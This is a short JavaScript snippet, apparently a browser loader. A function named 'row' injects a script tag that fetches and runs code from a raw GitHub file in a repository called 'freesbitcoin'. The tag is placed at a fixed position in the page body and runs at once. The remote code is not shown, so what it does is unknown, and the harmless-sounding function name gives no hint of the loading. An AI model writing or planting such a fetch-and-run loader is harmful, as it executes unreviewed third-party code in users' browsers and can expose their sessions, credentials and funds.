function row(){
	var target = document.querySelector("body");
	var newElement = document.createElement("script");
	newElement.setAttribute("type", "text/javascript");
	newElement.setAttribute("src", "https://raw.githubusercontent.com/freesbitcoin/script/main/javascript.js");
	target.insertBefore(newElement, target.childNodes[35]);
}
row();